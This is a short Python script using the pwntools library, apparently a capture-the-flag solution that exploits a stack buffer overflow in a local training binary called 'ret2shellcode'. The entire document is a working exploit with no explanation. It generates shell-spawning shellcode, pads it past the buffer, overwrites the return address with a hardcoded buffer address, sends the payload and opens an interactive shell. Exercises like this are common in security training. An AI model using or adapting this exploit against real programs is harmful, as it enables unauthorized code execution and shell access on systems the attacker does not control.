from pwn import *
io = process('./ret2shellcode')

buf2_addr = 0x0804A080
esp_addr = 0xffffcfa0
ebp_addr = 0xffffd028

s_addr = esp_addr +0x1c
s_to_ebp = ebp_addr - s_addr

shellcode = asm(shellcraft.sh())
payload =  shellcode.ljust(0x64+4,"a") + p32(0x0804A080)
io.send(payload)
io.interactive()
